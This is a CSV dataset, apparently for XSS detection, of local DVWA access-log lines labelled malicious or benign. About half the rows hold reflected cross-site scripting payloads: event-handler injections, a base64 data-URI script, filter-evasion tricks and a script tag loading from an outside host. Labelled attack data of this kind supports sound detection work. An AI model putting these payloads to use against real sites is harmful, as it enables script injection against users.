,url,malicious
14844,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=`xx:xx`onerror=alert(1)>"" 400 0 ""-"" ""-""",1
3415,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\"">test</a>"" 400 0 ""-"" ""-""",1
9958,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noframes onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
18651,"127.0.0.1 - - [03/May/2021:03:11:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Attilio HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10747,"127.0.0.1 - - [03/May/2021:03:41:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<strong onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
15570,"127.0.0.1 - - [03/May/2021:03:10:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Annetta HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5396,"127.0.0.1 - - [03/May/2021:03:23:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Odile HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10865,"127.0.0.1 - - [03/May/2021:03:13:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Chick HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17564,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<textarea onmousedown=\""alert(1)\"">test</textarea>"" 400 0 ""-"" ""-""",1
369,"127.0.0.1 - - [03/May/2021:03:14:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dierdre HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1427,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IFRAME SRC=#"" 400 0 ""-"" ""-""",1
11128,"127.0.0.1 - - [03/May/2021:03:15:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ehi HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7996,"127.0.0.1 - - [03/May/2021:02:35:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<///style///><span %2F"" 400 0 ""-"" ""-""",1
5975,"127.0.0.1 - - [03/May/2021:02:29:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cmarquee%20loop%3d1%20width%3d0%20onfinish%3dalert(1)%3e HTTP/1.1"" 200 1688 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
7489,"127.0.0.1 - - [03/May/2021:03:20:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lorain HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10516,"127.0.0.1 - - [03/May/2021:03:41:27 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><small onload=alert(1)></small>"" 400 0 ""-"" ""-""",1
9168,"127.0.0.1 - - [03/May/2021:03:40:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<html onclick=\""alert(1)\"">test</html>"" 400 0 ""-"" ""-""",1
327,"127.0.0.1 - - [03/May/2021:03:05:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=acces HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
495,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<SCRIPT SRC=\""http://ha.ckers.org/xss.jpg\""></SCRIPT>"" 400 0 ""-"" ""-""",1
434,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""`'><script>\\xC2\\x85javascript:alert(1)</script> HTTP/1.1"" 200 1722 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
14373,"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<u onmouseenter=\""alert(1)\"">test</u>"" 400 0 ""-"" ""-""",1
14327,"127.0.0.1 - - [03/May/2021:03:15:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Eleonore HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8992,"127.0.0.1 - - [03/May/2021:03:18:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Isa HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11291,"127.0.0.1 - - [03/May/2021:02:34:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\x05javascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",1
2257,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<bdi onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
6467,"127.0.0.1 - - [03/May/2021:03:21:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Margarethe HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16116,"127.0.0.1 - - [03/May/2021:03:25:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Roseanne HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9829,"127.0.0.1 - - [03/May/2021:03:09:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Adara HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2172,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script ~~~>alert(0%0)</script"" 400 0 ""-"" ""-""",1
1848,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<form><button formaction=javascript&colon;alert(1)>CLICKME"" 400 0 ""-"" ""-""",1
6281,"127.0.0.1 - - [03/May/2021:03:18:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Joletta HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
467,"127.0.0.1 - - [03/May/2021:02:34:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<video poster=javascript:javascript:alert(1)//"" 400 0 ""-"" ""-""",1
562,"127.0.0.1 - - [03/May/2021:03:08:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=ver HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
262,"127.0.0.1 - - [03/May/2021:03:18:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Irv HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17664,"127.0.0.1 - - [03/May/2021:03:40:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<header draggable=\""true\"""" 400 0 ""-"" ""-""",1
6784,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<nav oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
7574,"127.0.0.1 - - [03/May/2021:03:25:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Royal HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14288,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meter id=x"" 400 0 ""-"" ""-""",1
6280,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;A HREF=\\\""http&#58;//1113982867/\\\""&gt;XSS&lt;/A&gt;"" 400 0 ""-"" ""-""",1
5523,"127.0.0.1 - - [03/May/2021:03:40:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<aside onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
6121,"127.0.0.1 - - [03/May/2021:03:06:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=hasi HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13556,"127.0.0.1 - - [03/May/2021:03:18:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Joella HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12924,"127.0.0.1 - - [03/May/2021:03:19:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Karlotta HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2639,"127.0.0.1 - - [03/May/2021:03:23:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Odilia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10757,"127.0.0.1 - - [03/May/2021:03:22:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Moe HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16242,"127.0.0.1 - - [03/May/2021:03:13:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cycelia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18614,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sub onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
2974,"127.0.0.1 - - [03/May/2021:03:19:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Julissa HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18305,"127.0.0.1 - - [03/May/2021:03:27:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Terry HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14964,"127.0.0.1 - - [03/May/2021:03:13:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Damil HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11004,"127.0.0.1 - - [03/May/2021:03:12:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Carlyn HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14018,"127.0.0.1 - - [03/May/2021:02:34:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\x10javascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",1
1833,"127.0.0.1 - - [03/May/2021:03:24:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Pick HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1194,"127.0.0.1 - - [03/May/2021:03:28:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vmchange HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5480,"127.0.0.1 - - [03/May/2021:03:41:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script onmousemove=\""alert(1)\"">test</script>"" 400 0 ""-"" ""-""",1
8178,"127.0.0.1 - - [03/May/2021:03:40:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
12243,"127.0.0.1 - - [03/May/2021:03:23:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nill HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15662,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<multicol id=x"" 400 0 ""-"" ""-""",1
4781,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<title id=x"" 400 0 ""-"" ""-""",1
12346,"127.0.0.1 - - [03/May/2021:03:23:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Noelani HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16861,"127.0.0.1 - - [03/May/2021:03:27:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Venita HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15245,"127.0.0.1 - - [03/May/2021:03:22:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Michaeline HTTP/1.1"" 200 1702 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10532,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<scr<script>ipt>alert(1)</scr</script>ipt> HTTP/1.1"" 200 1713 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
7210,"127.0.0.1 - - [03/May/2021:03:26:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tamara HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4956,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div id=\""44\""><style>*[{}@import'test.css?]{color:"" 400 0 ""-"" ""-""",1
2612,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\\\"";alert('XSS');// HTTP/1.1"" 200 1708 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
7389,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=x"" 400 0 ""-"" ""-""",1
2189,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>~'\\u0061' ;"" 400 0 ""-"" ""-""",1
2485,"127.0.0.1 - - [03/May/2021:03:23:52 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Partha HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13351,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name='\"">><script>alert('XSS')</script> HTTP/1.1"" 200 1711 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
14392,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<%<!--'%><script>alert(1);</script -->"" 400 0 ""-"" ""-""",1
3036,"127.0.0.1 - - [03/May/2021:03:23:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nat HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4607,"127.0.0.1 - - [03/May/2021:03:24:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rafaelia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1569,"127.0.0.1 - - [03/May/2021:03:25:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ronen HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
4760,"127.0.0.1 - - [03/May/2021:03:23:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nikolia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7610,"127.0.0.1 - - [03/May/2021:03:40:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<frame id=x"" 400 0 ""-"" ""-""",1
17572,"127.0.0.1 - - [03/May/2021:03:16:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Greet HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
581,"127.0.0.1 - - [03/May/2021:03:27:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Toby HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3094,"127.0.0.1 - - [03/May/2021:03:40:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<audio onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
10901,"127.0.0.1 - - [03/May/2021:03:40:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<em draggable=\""true\"""" 400 0 ""-"" ""-""",1
11179,"127.0.0.1 - - [03/May/2021:03:05:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=abc HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7363,"127.0.0.1 - - [03/May/2021:03:21:50 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marlena HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14380,"127.0.0.1 - - [03/May/2021:03:17:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hildagard HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14868,"127.0.0.1 - - [03/May/2021:03:25:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rubetta HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3949,"127.0.0.1 - - [03/May/2021:03:12:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Carmelia HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16672,"127.0.0.1 - - [03/May/2021:03:28:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Wai-Bun HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8087,"127.0.0.1 - - [03/May/2021:03:08:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=success HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2911,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
1432,"127.0.0.1 - - [03/May/2021:03:12:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Celestine HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13187,"127.0.0.1 - - [03/May/2021:03:21:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Maryrose HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10375,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<p onmousedown=\""alert(1)\"">test</p>"" 400 0 ""-"" ""-""",1
16892,"127.0.0.1 - - [03/May/2021:03:18:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jenilee HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6220,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<<SCRIPT>alert(\""XSS\"");//<</SCRIPT> HTTP/1.1"" 200 1716 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
17678,"127.0.0.1 - - [03/May/2021:03:25:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shahab HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13596,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<mark onmouseup=\""alert(1)\"">test</mark>"" 400 0 ""-"" ""-""",1
15778,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>.XSS{background-image:url(\""javascript:alert('XSS')\"");}</STYLE><A CLASS=XSS></A>"" 400 0 ""-"" ""-""",1
2296,"127.0.0.1 - - [03/May/2021:03:19:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kasper HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16797,"127.0.0.1 - - [03/May/2021:03:27:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vanya HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3461,"127.0.0.1 - - [03/May/2021:03:41:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<progress onmousedown=\""alert(1)\"">test</progress>"" 400 0 ""-"" ""-""",1
2007,"127.0.0.1 - - [03/May/2021:03:40:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dl onmouseout=\""alert(1)\"">test</dl>"" 400 0 ""-"" ""-""",1
2080,"127.0.0.1 - - [03/May/2021:03:06:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=entrada HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
